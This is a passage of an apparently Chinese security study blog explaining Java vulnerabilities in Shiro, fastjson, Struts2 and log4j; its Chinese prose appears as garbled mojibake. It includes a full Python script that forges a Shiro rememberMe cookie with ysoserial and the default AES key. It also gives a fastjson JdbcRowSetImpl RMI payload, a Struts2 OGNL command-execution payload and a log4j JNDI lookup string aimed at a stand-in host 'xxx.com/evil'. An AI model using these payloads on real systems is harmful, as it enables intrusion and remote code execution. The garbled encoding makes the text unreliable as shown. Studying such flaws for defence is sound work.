å¯†ï¼Œå¯ä»¥ä¸å›ºå®šï¼Œå¯ä»¥ä½¿ç”¨padding oracle attackçš„å·¥å…·è¿›è¡Œåˆ©ç”¨ï¼Œå¥½åƒè¿˜éœ€è¦æä¾›ä¸€ä¸ªæœ‰æ•ˆçš„cookieï¼Œä»¥åŠéœ€è¦æ˜ç¡®å¯¹æ–¹çš„æ“ä½œç³»ç»Ÿ</p></blockquote><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†</p><blockquote><p>ååºåˆ—åŒ–æ“ä½œçš„æœ¬è´¨æ˜¯å°†è¾“å…¥çš„å­—èŠ‚æµè½¬æ¢æˆç¨‹åºä¸­çš„å¯¹è±¡å®ä¾‹ï¼Œè€Œåœ¨Javaä¸­ï¼Œå¯¹è±¡å®ä¾‹çš„åˆ›å»ºä¸å¯¹è±¡çš„æ„é€ å‡½æ•°ç›¸å…³è”ï¼Œå› æ­¤æ”»å‡»è€…åœ¨æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®æ—¶å¯ä»¥æ­è½½ç‰¹å®šçš„æ„é€ å‡½æ•°ï¼Œè¿›è€Œåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘è‡ªå®šä¹‰çš„ä»£ç </p></blockquote><h2 id="Shiro-rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰"><a href="#Shiro-rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰" class="headerlink" title="Shiro rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰"></a>Shiro rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰</h2><p>Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookie</p><p>ç”Ÿæˆè¿‡ç¨‹ï¼šrememberMeçš„å€¼-ã€‹åºåˆ—åŒ–-ã€‹AESåŠ å¯†-ã€‹base64ç¼–ç -ã€‹å¾—åˆ°cookieå€¼</p><p>æœåŠ¡å™¨ï¼šbase64è§£ç -ã€‹ç„¶åAESè§£å¯†-ã€‹å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´</p><p><strong>å¦‚æœä½¿ç”¨äº†é»˜è®¤çš„ç¡¬ç¼–ç çš„AESç§˜é’¥<code>kPH+bIxk5D2deZiIxcaaaA==</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ æ¶æ„payloadï¼Œé€šè¿‡åœ¨cookieçš„rememberMeå­—æ®µä¸­æ’å…¥æ¶æ„payloadï¼Œè§¦å‘shiroæ¡†æ¶çš„rememberMeçš„ååºåˆ—åŒ–åŠŸèƒ½ï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</strong></p><h3 id="å¦‚ä½•å‘ç°ä½¿ç”¨Shiroçš„ç³»ç»Ÿ"><a href="#å¦‚ä½•å‘ç°ä½¿ç”¨Shiroçš„ç³»ç»Ÿ" class="headerlink" title="å¦‚ä½•å‘ç°ä½¿ç”¨Shiroçš„ç³»ç»Ÿ"></a>å¦‚ä½•å‘ç°ä½¿ç”¨Shiroçš„ç³»ç»Ÿ</h3><ul><li>åœ¨ç™»å½•é¡µé¢æ—¶ï¼Œæäº¤è¡¨å•åçœ‹set-cookieæ˜¯å¦å­˜åœ¨remeberMe=deleteMe(è®¤è¯å¤±è´¥æ—¶ä¼šè®¾ç½®deleteMeçš„cookie:)</li><li>åœ¨æµé‡ä¸­æœç´¢remeberMe=deleteMe</li><li>fofaçš„æœç´¢å…³é”®è¯ï¼šheader=â€rememberme=deleteMeâ€ã€header=â€shiroCookieâ€</li></ul><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><ul><li>è·å–åå‘shell</li><li>è¿œç¨‹ä»£ç æ‰§è¡Œ</li></ul><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])   <br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode())<br></code></pre></td></tr></table></figure><h2 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h2><blockquote><p><strong>è¿™ä¸¤ä¸ªæ¼æ´ä¸»è¦åŒºåˆ«åœ¨äºShiro550ä½¿ç”¨å·²çŸ¥å¯†é’¥æ’ï¼Œåè€…Shiro721æ˜¯ä½¿ç”¨</strong><code>ç™»å½•årememberMe=&#123;value&#125;å»çˆ†ç ´æ­£ç¡®çš„keyå€¼</code><strong>è¿›è€Œååºåˆ—åŒ–ï¼Œå¯¹æ¯”Shiro550æ¡ä»¶åªè¦æœ‰</strong><code>è¶³å¤Ÿå¯†é’¥åº“</code><strong>ï¼ˆæ¡ä»¶æ¯”è¾ƒä½ï¼‰ã€Shiro721éœ€è¦ç™»å½•ï¼ˆè¦æ±‚æ¯”è¾ƒé«˜</strong><del><strong>é¸¡è‚‹</strong></del>ï¼‰ã€‚</p></blockquote><p>Shiroä½¿ç”¨äº†<strong>AES-128-CBCåŠ å¯†</strong>ï¼ˆCipher Block Chaining , å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼ï¼‰</p><p>æ˜æ–‡æŒ‰ç…§å›ºå®šå¤§å°è¿›è¡Œåˆ†ç»„ï¼Œæœ€åä¸€ä¸ªæ•°æ®å—ä¼šè¿›è¡Œå¡«å……ï¼Œä½¿å…¶æ»¡è¶³å—çš„é•¿åº¦è¦æ±‚ã€‚å‡è®¾æœ€åä¸€ä¸ªæ•°æ®å—åˆ†ç»„ä¸ä¸º16byteæ—¶ï¼Œå°±ä¼šè¿›è¡Œå¡«å……ï¼Œæ¯ä¸ªè¢«å¡«å……çš„å­—èŠ‚çš„å€¼å°±æ˜¯è¢«å¡«å……çš„å­—èŠ‚æ•°é‡ ã€‚æ¯”å¦‚è¯´ï¼Œ<strong>å¦‚æœç¼ºå°‘å››ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆè¿™å››ä¸ªå­—èŠ‚éƒ½ä¼šè¢«å¡«å……ä¸º0x04</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305011823616.png"></p><p>ä¸Šé¢æ˜¯CBCçš„æµç¨‹ï¼Œåˆå§‹åŒ–å‘é‡ï¼ˆIVï¼‰ä¼šè¢«ç”¨åœ¨åŠ å¯†å’Œè§£å¯†çš„è¿‡ç¨‹ä¸­</p><ul><li><p>åŠ å¯†ï¼šç¬¬ä¸€æ®µæ˜æ–‡å’ŒIVå¼‚æˆ–ï¼Œä¹‹åè¿›è¡ŒåŠ å¯†ï¼Œå°†ç»“æœä¸ä¸‹ä¸€æ®µæ˜æ–‡è¿›è¡Œå¼‚æˆ–ï¼Œè¿™æ ·çš„è¯ï¼Œå¯ä»¥ä½¿å¾—å³ä½¿æ˜¯ç›¸åŒçš„æ˜æ–‡ï¼Œä¹Ÿå¯ä»¥è¢«åŠ å¯†æˆä¸åŒçš„å†…å®¹</p></li><li><p>è§£å¯†ï¼šç¬¬ä¸€æ®µå¯†æ–‡è¿›è¡Œè§£å¯†ï¼Œè§£å¯†ç»“æœä¸IVè¿›è¡Œå¼‚æˆ–ï¼Œè¿™æ ·æ‰èƒ½å¾—åˆ°æ˜æ–‡</p></li></ul><p>è‹¥æœ€å1ä¸ªè§£å¯†å‡ºçš„æ˜æ–‡paddingå¡«å……å€¼é”™è¯¯ï¼Œä¼šå¯¼è‡´è§£å¯†ä¸æˆåŠŸï¼ŒæŠ¥é”™ã€‚å› æ­¤å¯ä»¥é€šè¿‡çˆ†ç ´è¿›è¡Œæ”»å‡»</p><ul><li>æ£€æµ‹å¯†æ–‡æœ€åä¸€ç»„çš„å¡«å……å€¼æ˜¯å¦æ­£ç¡®æ¥ç¡®å®šèƒ½å¦æ­£å¸¸è§£å¯†</li><li>é€šè¿‡æœåŠ¡ç«¯è§£å¯†åçš„å“åº”çŠ¶æ€æ¥åˆ¤æ–­å¡«å……çš„å­—èŠ‚æ˜¯å¦æ­£ç¡®æ¥è¿›è¡Œç©·ä¸¾æ”»å‡»<ul><li>ç”¨æˆ·çš„å¯†æ–‡ä¸å¡«å……æ•°æ®æ­£ç¡® ==&gt; 200</li><li>ç”¨æˆ·çš„å¯†æ–‡ä¸å¡«å……æ•°æ®éƒ½é”™è¯¯ ==&gt; 500</li><li>ç”¨æˆ·çš„å¯†æ–‡æ­£ç¡®ï¼Œå¡«å……æ•°æ®é”™è¯¯ ==&gt; 301</li></ul></li></ul><p>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„åŸç† : é€šè¿‡æŸåå¯†æ–‡å­—èŠ‚æ¥æ”¹å˜æ˜æ–‡å­—èŠ‚</p><p>å†™ä¸ä¸‹å»äº†ï¼Œå‚è€ƒä¸€ä¸‹è¿™ä¸ªï¼š</p><ul><li><p><a href="https://blog.h4ck.fun/shiro_721_analysis/">https://blog.h4ck.fun/shiro_721_analysis/</a></p></li><li><p><a href="https://goodapple.top/archives/217#leftbar_tab_catalog">https://goodapple.top/archives/217#leftbar_tab_catalog</a></p></li><li><p><a href="https://www.sec-in.com/article/999">https://www.sec-in.com/article/999</a></p></li><li><p><a href="https://blog.csdn.net/weixin_45605352/article/details/116846678">https://blog.csdn.net/weixin_45605352/article/details/116846678</a></p></li><li><p><a href="https://blog.csdn.net/qq_41874930/article/details/121314926">https://blog.csdn.net/qq_41874930/article/details/121314926</a></p></li></ul><h1 id="fastjsonæ¼æ´"><a href="#fastjsonæ¼æ´" class="headerlink" title="fastjsonæ¼æ´"></a>fastjsonæ¼æ´</h1><p>Fastjsonæ˜¯ä¸€ä¸ªJavaè¯­è¨€ç¼–å†™çš„é«˜æ€§èƒ½JSONå¤„ç†åº“ï¼Œæ”¯æŒå°†Javaå¯¹è±¡è½¬æ¢ä¸ºJSONä¸²ï¼Œä»¥åŠå°†JSONä¸²è½¬æ¢ä¸ºJavaå¯¹è±¡</p><h2 id="fastjson-1-2-24ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-18349ï¼‰"><a href="#fastjson-1-2-24ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-18349ï¼‰" class="headerlink" title="fastjson 1.2.24ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-18349ï¼‰"></a>fastjson 1.2.24ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-18349ï¼‰</h2><p>@typeæ˜¯fastjsonä¸­ç”¨äºæŒ‡å®šJavaç±»ç±»å‹ä¿¡æ¯çš„ä¸€ç§æ³¨è§£æ ‡ç­¾ã€‚åœ¨fastjsonçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå‘ç°JSONä¸²ä¸­å­˜åœ¨@typeæ ‡ç­¾ï¼Œfastjsonä¼šæ ¹æ®è¯¥æ ‡ç­¾æ¥è¿›è¡Œè‡ªåŠ¨ç±»å‹è½¬æ¢ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.example.User&quot;</span>,<br>    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>    <span class="hljs-attr">&quot;age&quot;</span>: <span class="hljs-number">25</span><br>&#125;<br></code></pre></td></tr></table></figure><p>fastjsonåœ¨è§£æè¯¥JSONä¸²æ—¶ï¼Œä¼šæ ¹æ®@typeçš„å€¼ï¼ˆâ€com.example.Userâ€ï¼‰ï¼Œå°†è¯¥JSONä¸²è½¬æ¢æˆä¸€ä¸ªå¯¹åº”çš„Javaå¯¹è±¡ï¼ˆcom.example.Userç±»å‹ï¼‰ï¼Œå¹¶å°†JSONä¸²ä¸­çš„å­—æ®µå€¼è®¾ç½®åˆ°Javaå¯¹è±¡ç›¸åº”çš„å±æ€§ä¸­ã€‚</p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„JSONæ•°æ®ï¼ŒJSONå­—ç¬¦ä¸²ä¸­åŒ…å«äº†**@typeæ³¨è§£ï¼Œå¹¶åœ¨å…¶ä¸­æŒ‡å‘äº†ä¸€ä¸ªæ¶æ„ç±»ï¼Œé‚£ä¹ˆfastjsonåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨å®ä¾‹åŒ–è¿™ä¸ªæ¶æ„ç±»ï¼Œå¹¶å°è¯•è°ƒç”¨å…¶ä¸­çš„setteræ–¹æ³•è®¾ç½®æ¶æ„çš„å‚æ•°å€¼**</p><p>setteræ–¹æ³•ï¼ˆä¹Ÿç§°ä½œè®¾ç½®æ–¹æ³•ï¼‰æ˜¯ä¸€ç§ç”¨äºè®¾ç½®æŸä¸ªå¯¹è±¡å±æ€§å€¼çš„ç‰¹æ®Šæ–¹æ³•ã€‚setteræ–¹æ³•é€šå¸¸é‡‡ç”¨ public void setXXX(XXX value)çš„å‘½åæ–¹å¼ï¼Œåœ¨å…¶ä¸­ä½¿ç”¨ä¸€ä¸ªå‚æ•°valueæ¥è®¾ç½®å¯¹è±¡ä¸­çš„å±æ€§å€¼ã€‚</p><p>ä¾‹å¦‚ï¼Œä¸€ä¸ªç±»å¯èƒ½åŒ…å«ä¸€ä¸ªå«åšnameçš„å±æ€§ï¼Œé‚£ä¹ˆå®ƒçš„setteræ–¹æ³•é€šå¸¸å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>)</span> &#123;<br>    <span class="hljs-built_in">this</span>.name = name;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªsetteræ–¹æ³•é€šè¿‡ä½¿ç”¨å‚æ•°nameè®¾ç½®ç±»ä¸­çš„nameå±æ€§ã€‚é€šè¿‡è®¾ç½®setteræ–¹æ³•ï¼Œå¯ä»¥æ§åˆ¶å±æ€§çš„è®¿é—®æƒé™ï¼Œé¿å…ç›´æ¥å¯¹æˆå‘˜å˜é‡è¿›è¡Œæ“ä½œï¼Œä»è€Œå¢å¼ºäº†ç¨‹åºçš„å®‰å…¨æ€§å’Œå°è£…æ€§ã€‚</p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ å«æœ‰ç‰¹å®šsetteræ–¹æ³•çš„payloadï¼Œåˆ©ç”¨fastjsonåº“è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•å¹¶ä¼ å…¥æ¶æ„å‚æ•°æ¥å®ç°æ”»å‡»ã€‚æ­¤ç±»æ”»å‡»é€šå¸¸è¢«ç§°ä¸ºfastjsonååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´</p><p>å¸¸è§çš„exploit payloadæ˜¯ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>@type</code>æŒ‡å®šè¦å®ä¾‹åŒ–çš„ç±»å‹ï¼Œ<code>dataSourceName</code>æŒ‡å®šäº†RMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰çš„æœåŠ¡åœ°å€å’ŒæœåŠ¡åã€‚è¿™ä¸ªpayloadä¼šå°†JdbcRowSetImplå®ä¾‹åŒ–å¹¶è¿æ¥åˆ°æŒ‡å®šçš„RMIæœåŠ¡ï¼Œä»è€Œå®ç°RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰æ”»å‡»</p><h1 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h1><h2 id="Struts2-016å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#Struts2-016å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="Struts2-016å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>Struts2-016å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><blockquote><p>struts2æ¼æ´æœ‰ä¸€ä¸ªæ˜æ˜¾çš„ç‰¹å¾å°±æ˜¯urlè·¯å¾„é‡Œæœ‰*.actionæˆ–*.do</p></blockquote><p>åœ¨Struts2ä¸­ï¼ŒDefaultActionMapperç±»æ˜¯ä¸€ä¸ªç”¨äºå¤„ç†URLåˆ°Actionçš„æ˜ å°„çš„é»˜è®¤å®ç°ã€‚å®ƒæ”¯æŒä½¿ç”¨â€action:â€ã€â€redirect:â€å’Œâ€redirectAction:â€ä½œä¸ºå¯¼èˆªæˆ–é‡å®šå‘å‰ç¼€ã€‚è¿™äº›å‰ç¼€åé¢å¯ä»¥è·ŸéšActionåç§°æˆ–OGNLè¡¨è¾¾å¼ã€‚</p><p><strong>ç”±äºStruts2æ²¡æœ‰å¯¹è¿™äº›å‰ç¼€è¿›è¡Œè¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨URLä¸­æ³¨å…¥æ¶æ„çš„OGNLè¡¨è¾¾å¼ï¼Œä»è€Œæ‰§è¡Œä»»æ„çš„Javaé™æ€æ–¹æ³•ï¼ŒåŒ…æ‹¬æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</strong>ã€‚è¿™ç§æ¼æ´è¢«ç§°ä¸ºâ€è¿œç¨‹å‘½ä»¤æ‰§è¡Œâ€ï¼ˆRCEï¼‰æ¼æ´ï¼Œæ˜¯ä¸€ç§éå¸¸å±é™©çš„å®‰å…¨æ¼æ´ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">redirect:$&#123;<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span>=false,#f=#_memberAccess<span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.getDeclaredField</span>(<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.setAccessible</span>(true),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.set</span>(#_memberAccess,true),@org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.io</span>.IOUtils@toString(@java<span class="hljs-selector-class">.lang</span>.Runtime@getRuntime()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;echo has vul&#x27;</span>)<span class="hljs-selector-class">.getInputStream</span>())&#125;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªæ¶æ„çš„Struts2 URLï¼Œå…¶ä¸­åˆ©ç”¨äº†OGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œé€šè¿‡è®¾ç½®xwork.MethodAccessor.denyMethodExecutionä¸ºfalseï¼Œå…è®¸æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œç„¶ååˆ©ç”¨åå°„æœºåˆ¶ä¿®æ”¹_memberAccesså¯¹è±¡çš„allowStaticMethodAccesså±æ€§ï¼Œä½¿å…¶å…è®¸è®¿é—®é™æ€æ–¹æ³•ï¼Œæœ€åè°ƒç”¨java.lang.Runtimeç±»çš„execæ–¹æ³•æ‰§è¡Œå‘½ä»¤â€echo has vulâ€ï¼Œå¹¶å°†è¾“å‡ºç»“æœè½¬æ¢ä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚</p><p>ä¸ºäº†é¿å…è¿™ç§æ¼æ´ï¼Œå»ºè®®åœ¨ä½¿ç”¨Struts2æ—¶ï¼Œå¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œé¿å…å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºOGNLè¡¨è¾¾å¼ç›´æ¥ä¼ é€’ç»™DefaultActionMapperç±»</p><h2 id="045"><a href="#045" class="headerlink" title="045"></a>045</h2><p>045æ¼æ´æ˜¯æŒ‡Apache Strutsæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå…¶æˆå› æ˜¯åœ¨æ¥å—content typeå€¼æ—¶ï¼Œæœªèƒ½æ­£ç¡®åœ°éªŒè¯å’Œè¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„OGNLè¡¨è¾¾å¼ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…¶ä¸­ï¼ŒOGNLæ˜¯ä¸€ç§è¡¨è¾¾å¼è¯­è¨€ï¼Œç”¨äºåœ¨Javaåº”ç”¨ç¨‹åºä¸­è®¿é—®å’Œæ“ä½œå¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨HTTPè¯·æ±‚ä¸­æ·»åŠ æ¶æ„çš„payloadï¼Œå…¶ä¸­åŒ…å«OGNLè¯­æ³•å’Œmember accesså­—æ®µï¼Œæ¥è§¦å‘æ¼æ´ã€‚ä¸€æ—¦æ¼æ´è¢«åˆ©ç”¨æˆåŠŸï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å—å½±å“çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œæ§åˆ¶æœåŠ¡å™¨æˆ–çªƒå–æ•æ„Ÿä¿¡æ¯ã€‚</p><ul><li>memberaccessæ˜¯OGNLè¡¨è¾¾å¼ä¸­çš„ä¸€ä¸ªå…³é”®å­—ï¼Œç”¨äºæ§åˆ¶OGNLè¡¨è¾¾å¼å¯¹Javaå¯¹è±¡çš„è®¿é—®æƒé™ã€‚åœ¨OGNLè¡¨è¾¾å¼ä¸­ï¼Œmemberaccesså­—æ®µå¯ä»¥è®¾ç½®ä¸ºâ€trueâ€æˆ–â€falseâ€ï¼Œåˆ†åˆ«è¡¨ç¤ºå…è®¸æˆ–ç¦æ­¢è®¿é—®Javaå¯¹è±¡çš„ç§æœ‰æˆå‘˜å˜é‡å’Œæ–¹æ³•ã€‚</li><li>åœ¨045æ¼æ´ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨HTTPè¯·æ±‚ä¸­æ·»åŠ æ¶æ„çš„payloadï¼Œå…¶ä¸­åŒ…å«memberaccesså­—æ®µï¼Œæ¥æ§åˆ¶OGNLè¡¨è¾¾å¼å¯¹Javaå¯¹è±¡çš„è®¿é—®æƒé™ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…å¯ä»¥å°†memberaccesså­—æ®µè®¾ç½®ä¸ºâ€trueâ€ï¼Œä»¥å…è®¸è®¿é—®Javaå¯¹è±¡çš„ç§æœ‰æˆå‘˜å˜é‡å’Œæ–¹æ³•ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</li></ul><p>ä¸ºäº†æ£€æµ‹å’Œé˜²æ­¢045æ¼æ´çš„æ”»å‡»ï¼Œå¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨çš„catalina.outæ—¥å¿—æ–‡ä»¶ï¼Œå…¶ä¸­å¯èƒ½ä¼šè®°å½•æœ‰å…³æ”»å‡»çš„ç›¸å…³ä¿¡æ¯ï¼Œä¾‹å¦‚æ¶æ„è¯·æ±‚çš„URLå’Œpayloadç­‰</p><h1 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h1><blockquote><p>log4j2æ¡†æ¶ä¸‹çš„lookupæœåŠ¡æä¾›äº†{}å­—æ®µè§£æåŠŸèƒ½ï¼Œä¼ è¿›å»çš„å€¼ä¼šè¢«ç›´æ¥è§£æï¼ŒJNDIæœåŠ¡ä¼šè¯·æ±‚è¿œç¨‹æœåŠ¡æ¥é“¾æ¥æœ¬åœ°å¯¹è±¡ï¼Œè¿™æ—¶å€™åªç”¨åœ¨ï½›}é‡Œé¢è°ƒç”¨JNDIæœåŠ¡å³å¯åå¼¹shellåˆ°æŒ‡å®šæœåŠ¡å™¨</p><p>ç‰¹å¾:æ•°æ®åŒ…é‡Œæœ‰{jndi:ladp//}å­—æ®µ</p></blockquote><p><strong>åœ¨å‰ç«¯é¡µé¢ä¸Šè¾“å…¥äº†ï¼š${jndi:rmi://xxx.com:8080/evil} è¿™ä¸²å­—ç¬¦ï¼Œ ç„¶ååå°ç”¨log4jè®°å½•äº†è¿™ä¸²å­—ç¬¦ï¼Œ log4jä¼šè‡ªåŠ¨ä½¿ç”¨jndiè°ƒç”¨è¿™ä¸ªåœ°å€ä¸Šçš„rmiå†…å®¹</strong></p><p>è¿™ä¸ªæ¼æ´å¯ä»¥è®©æ”»å‡»è€…é€šè¿‡å‘å—å½±å“çš„åº”ç”¨ç¨‹åºå‘é€åŒ…å«æ¶æ„JNDIï¼ˆJava Naming and Directory Interfaceï¼‰å¼•ç”¨çš„å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚è¿™äº›å­—ç¬¦ä¸²é€šå¸¸ä»¥${jndi:å¼€å¤´ï¼Œåé¢è·Ÿç€ä¸€ä¸ªæ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨åœ°å€å’Œä¸€ä¸ªå¯æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><p> JNDIæ˜¯Javaå‘½åå’Œç›®å½•æ¥å£ï¼Œå®ƒæ˜¯ä¸€ç§æä¾›å‘½åå’Œç›®å½•åŠŸèƒ½çš„APIï¼Œå¯ä»¥è®©Javaåº”ç”¨ç¨‹åºè®¿é—®å„ç§å‘½åå’Œç›®å½•æœåŠ¡</p><p>RMIï¼ˆRemote Method 